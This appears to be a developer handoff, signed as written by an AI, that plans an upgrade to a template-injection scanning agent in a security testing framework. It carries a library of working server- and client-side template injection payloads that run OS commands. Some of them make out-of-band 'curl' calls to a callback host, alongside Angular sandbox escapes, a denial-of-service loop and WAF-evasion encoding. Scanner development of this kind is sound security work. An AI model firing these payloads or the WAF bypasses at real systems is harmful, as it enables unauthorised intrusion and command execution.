# Handoff: CSTIAgent V2 - Intelligent Template Injection with Q-Learning WAF Bypass

**Date**: 2026-01-21
**Author**: Claude (Opus 4.5)
**Priority**: HIGH
**Estimated Effort**: Medium (2-3 hours implementation)

---

## 1. Executive Summary

The current `CSTIAgent` (171 lines) is functional but significantly more basic than the recently upgraded `XSSAgent` and `SQLMapAgent`. This handoff documents the improvements needed to bring CSTIAgent to the same level of intelligence:

1. **Q-Learning WAF Integration** - Use framework's `waf_fingerprinter`, `strategy_router`, `encoding_techniques`
2. **Template Engine Fingerprinting** - Detect Angular, Vue, Jinja2, Twig, Freemarker, etc.
3. **Expanded Payload Library** - From 10 to 50+ payloads covering all major engines
4. **OOB Validation** - Interactsh integration for blind SSTI
5. **Learning Feedback** - Record successful bypasses for continuous improvement

---

## 2. Current State Analysis

### File: `bugtrace/agents/csti_agent.py`

**Strengths:**
- ✅ Arithmetic proof validation (7*7=49) - solid binary proof
- ✅ LLM-driven advanced probing as fallback
- ✅ Clean, simple architecture

**Weaknesses:**
- ❌ **No WAF detection** - Doesn't use framework's `waf_fingerprinter`
- ❌ **No encoding/bypass strategies** - Doesn't use `strategy_router` or `encoding_techniques`
- ❌ **Limited payloads** - Only 10 hardcoded payloads
- ❌ **No engine fingerprinting** - Doesn't detect which template engine is in use
- ❌ **No OOB validation** - Can't detect blind SSTI
- ❌ **No polyglots** - No cross-engine payloads
- ❌ **No learning feedback** - Doesn't record what works

---

## 3. Implementation Plan

### 3.1 Add WAF Intelligence Imports

```python
# At top of csti_agent.py, add:
from bugtrace.tools.waf import waf_fingerprinter, strategy_router, encoding_techniques
from bugtrace.tools.interactsh import InteractshClient
```

### 3.2 Add Template Engine Fingerprinter

Create detection for template engines based on response patterns:

```python
class TemplateEngineFingerprinter:
    """Detect which template engine is in use."""

    ENGINE_SIGNATURES = {
        "angular": {
            "patterns": ["ng-app", "ng-model", "ng-bind", "angular.js", "angular.min.js"],
            "probe": "{{constructor.constructor('return 1')()}}",
            "success_indicator": "1"
        },
        "vue": {
            "patterns": ["v-if", "v-for", "v-model", "vue.js", "vue.min.js"],
            "probe": "{{7*7}}",
            "success_indicator": "49"
        },
        "jinja2": {
            "patterns": ["jinja", "flask", "werkzeug"],
            "probe": "{{config}}",
            "success_indicator": "Config"
        },
        "twig": {
            "patterns": ["twig", "symfony"],
            "probe": "{{7*7}}",
            "success_indicator": "49"
        },
        "freemarker": {
            "patterns": ["freemarker", ".ftl"],
            "probe": "${7*7}",
            "success_indicator": "49"
        },
        "velocity": {
            "patterns": ["velocity", ".vm"],
            "probe": "#set($x=7*7)$x",
            "success_indicator": "49"
        },
        "mako": {
            "patterns": ["mako"],
            "probe": "${7*7}",
            "success_indicator": "49"
        },
        "pebble": {
            "patterns": ["pebble"],
            "probe": "{{ 7*7 }}",
            "success_indicator": "49"
        },
        "smarty": {
            "patterns": ["smarty"],
            "probe": "{$smarty.version}",
            "success_indicator": "Smarty"
        },
        "erb": {
            "patterns": ["erb", "ruby", "rails"],
            "probe": "<%= 7*7 %>",
            "success_indicator": "49"
        }
    }

    @classmethod
    def fingerprint(cls, html: str, headers: dict = None) -> List[str]:
        """Return list of likely template engines."""
        detected = []
        html_lower = html.lower()

        for engine, data in cls.ENGINE_SIGNATURES.items():
            for pattern in data["patterns"]:
                if pattern.lower() in html_lower:
                    detected.append(engine)
                    break

        return detected if detected else ["unknown"]
```

### 3.3 Expanded Payload Library

Organize payloads by engine for targeted testing:

```python
PAYLOAD_LIBRARY = {
    # ================================================================
    # UNIVERSAL ARITHMETIC PROBES (work on most engines)
    # ================================================================
    "universal": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "[[7*7]]",
        "{7*7}",
        "{{7*'7'}}",
        "${7*'7'}",
    ],

    # ================================================================
    # ANGULAR-SPECIFIC (CSTI)
    # ================================================================
    "angular": [
        "{{constructor.constructor('return 7*7')()}}",
        "{{$on.constructor('return 7*7')()}}",
        "{{a]}}",  # Error-based detection
        "{{'a]'}}",
        "{{[].pop.constructor('return 7*7')()}}",
        # Sandbox bypasses (Angular 1.x)
        "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}",
        "{{'a]'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
    ],

    # ================================================================
    # VUE-SPECIFIC (CSTI)
    # ================================================================
    "vue": [
        "{{7*7}}",
        "{{constructor.constructor('return 7*7')()}}",
        "{{_c.constructor('return 7*7')()}}",
    ],

    # ================================================================
    # JINJA2-SPECIFIC (SSTI)
    # ================================================================
    "jinja2": [
        "{{config}}",
        "{{config.items()}}",
        "{{self.__init__.__globals__}}",
        "{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        # OOB (with placeholder)
        "{{config.__class__.__init__.__globals__['os'].popen('curl {{INTERACTSH}}').read()}}",
        # Blind detection
        "{% for x in range(100000000) %}a{% endfor %}",  # DoS-based detection
    ],

    # ================================================================
    # TWIG-SPECIFIC (SSTI)
    # ================================================================
    "twig": [
        "{{7*7}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{app.request.server.all|join(',')}}",
        # OOB
        "{{['curl {{INTERACTSH}}']|filter('exec')}}",
    ],

    # ================================================================
    # FREEMARKER-SPECIFIC (SSTI)
    # ================================================================
    "freemarker": [
        "${7*7}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        # OOB
        "${\"freemarker.template.utility.Execute\"?new()(\"curl {{INTERACTSH}}\")}",
    ],

    # ================================================================
    # VELOCITY-SPECIFIC (SSTI)
    # ================================================================
    "velocity": [
        "#set($x=7*7)$x",
        "#set($rt=$x.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null))$rt.exec('id')",
        # OOB
        "#set($rt=$x.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null))$rt.exec('curl {{INTERACTSH}}')",
    ],

    # ================================================================
    # MAKO-SPECIFIC (SSTI)
    # ================================================================
    "mako": [
        "${7*7}",
        "${self.module.cache.util.os.popen('id').read()}",
        "<%import os%>${os.popen('id').read()}",
        # OOB
        "<%import os%>${os.popen('curl {{INTERACTSH}}').read()}",
    ],

    # ================================================================
    # ERB-SPECIFIC (Ruby)
    # ================================================================
    "erb": [
        "<%= 7*7 %>",
        "<%= system('id') %>",
        "<%= `id` %>",
        # OOB
        "<%= system('curl {{INTERACTSH}}') %>",
    ],

    # ================================================================
    # POLYGLOTS (work across multiple engines)
    # ================================================================
    "polyglots": [
        "{{7*7}}${7*7}<%= 7*7 %>#{7*7}",
        "${{7*7}}",
        "{{7*7}}[[7*7]]",
    ],

    # ================================================================
    # WAF BYPASS VARIANTS (encoded versions)
    # ================================================================
    "waf_bypass": [
        # URL encoded
        "%7b%7b7*7%7d%7d",
        # Unicode
        "\\u007b\\u007b7*7\\u007d\\u007d",
        # Double encoded
        "%257b%257b7*7%257d%257d",
        # HTML entities
        "&#123;&#123;7*7&#125;&#125;",
        # Mixed case (for JS engines)
        "{{7*7}}",
    ],
}
```

### 3.4 WAF Detection and Bypass Integration

Add methods similar to XSSAgent:

```python
async def _detect_waf_async(self) -> Tuple[str, float]:
    """Detect WAF using framework's intelligent fingerprinter."""
    try:
        waf_name, confidence = await waf_fingerprinter.detect(self.url)
        self._detected_waf = waf_name if waf_name != "unknown" else None
        self._waf_confidence = confidence

        if self._detected_waf:
            logger.info(f"[{self.name}] WAF Detected: {waf_name} ({confidence:.0%})")
            dashboard.log(f"[{self.name}] 🛡️ WAF: {waf_name} ({confidence:.0%})", "INFO")

        return waf_name, confidence
    except Exception as e:
        logger.debug(f"WAF detection failed: {e}")
        return "unknown", 0.0

async def _get_encoded_payloads(self, payloads: List[str]) -> List[str]:
    """Apply Q-Learning optimized encoding to payloads."""
    if not self._detected_waf:
        return payloads

    encoded = []
    for payload in payloads:
        encoded.append(payload)  # Original

        # Apply WAF-specific encodings
        variants = encoding_techniques.encode_payload(
            payload,
            waf=self._detected_waf,
            max_variants=3
        )
        encoded.extend(variants)

    return list(dict.fromkeys(encoded))  # Dedupe preserving order

def _record_bypass_result(self, payload: str, success: bool):
    """Record result for Q-Learning feedback."""
    if not self._detected_waf:
        return

    encoding_used = "unknown"
    if "%25" in payload:
        encoding_used = "double_url_encode"
    elif "\\u00" in payload:
        encoding_used = "unicode_encode"
    elif "&#" in payload:
        encoding_used = "html_entity_encode"

    strategy_router.record_result(self._detected_waf, encoding_used, success)
```

### 3.5 Interactsh Integration for Blind SSTI

```python
async def _setup_interactsh(self):
    """Register with Interactsh for OOB validation."""
    self.interactsh = InteractshClient()
    await self.interactsh.register()
    self.interactsh_url = self.interactsh.get_url("csti_agent")
    logger.info(f"[{self.name}] Interactsh ready: {self.interactsh_url}")

async def _check_oob_hit(self, label: str) -> bool:
    """Check if we got an OOB callback."""
    if not self.interactsh:
        return False

    await asyncio.sleep(2)  # Wait for callback
    hit = await self.interactsh.check_hit(label)
    return hit is not None
```

### 3.6 Updated run_loop Flow

```python
async def run_loop(self) -> Dict:
    dashboard.current_agent = self.name
    dashboard.log(f"[{self.name}] 🚀 Starting Template Injection analysis", "INFO")

    all_findings = []

    try:
        # Phase 0: WAF Detection
        await self._detect_waf_async()

        # Phase 1: Setup Interactsh for OOB
        await self._setup_interactsh()

        async with aiohttp.ClientSession() as session:
            for item in self.params:
                param = item.get("parameter")
                if not param:
                    continue

                # Phase 2: Engine Fingerprinting
                html = await self._fetch_page(session)
                engines = TemplateEngineFingerprinter.fingerprint(html)
                logger.info(f"[{self.name}] Detected engines: {engines}")

                # Phase 3: Targeted Probing
                finding = await self._targeted_probe(session, param, engines)
                if finding:
                    all_findings.append(finding)
                    self._record_bypass_result(finding["payload"], success=True)
                    continue

                # Phase 4: Universal + Polyglot Probing
                finding = await self._universal_probe(session, param)
                if finding:
                    all_findings.append(finding)
                    self._record_bypass_result(finding["payload"], success=True)
                    continue

                # Phase 5: OOB (Blind SSTI)
                finding = await self._oob_probe(session, param, engines)
                if finding:
                    all_findings.append(finding)
                    self._record_bypass_result(finding["payload"], success=True)
                    continue

                # Phase 6: LLM Advanced Bypass (if all else fails)
                if self._detected_waf:
                    finding = await self._llm_probe(session, param)
                    if finding:
                        all_findings.append(finding)

        # Cleanup
        if self.interactsh:
            await self.interactsh.deregister()

    except Exception as e:
        logger.error(f"CSTIAgent error: {e}")

    dashboard.log(f"[{self.name}] ✅ Complete. Findings: {len(all_findings)}", "SUCCESS")
    return {"findings": all_findings, "status": JobStatus.COMPLETED}
```

---

## 4. Testing Checklist

After implementation, verify:

- [ ] WAF detection works (test against Cloudflare-protected site)
- [ ] Engine fingerprinting detects Angular, Jinja2, etc.
- [ ] Payloads are encoded when WAF is detected
- [ ] Interactsh OOB callbacks work for blind SSTI
- [ ] Q-Learning feedback is recorded (`bugtrace/data/waf_strategy_learning.json`)
- [ ] All existing tests pass
- [ ] New findings are properly marked as `VALIDATED_CONFIRMED`

---

## 5. Files to Modify

| File | Action |
|------|--------|
| `bugtrace/agents/csti_agent.py` | Major rewrite (add all features above) |
| `bugtrace/tools/waf/__init__.py` | Already has exports (no change needed) |

---

## 6. Dependencies

Already available in the codebase:
- `bugtrace/tools/waf/fingerprinter.py` - WAF detection
- `bugtrace/tools/waf/strategy_router.py` - Q-Learning strategy selection
- `bugtrace/tools/waf/encodings.py` - 12+ encoding techniques
- `bugtrace/tools/interactsh.py` - OOB validation

---

## 7. Reference Implementations

For implementation patterns, refer to:
- `bugtrace/agents/xss_agent.py` - Lines 255-353 (WAF integration)
- `bugtrace/agents/sqlmap_agent.py` - Lines 176-292 (WAFBypassStrategy class)

---

## 8. Success Criteria

The upgraded CSTIAgent should:
1. Detect WAFs and apply appropriate encoding
2. Fingerprint template engines and use targeted payloads
3. Support OOB validation for blind SSTI
4. Learn from successful bypasses via Q-Learning
5. Maintain 100% backward compatibility with existing findings format
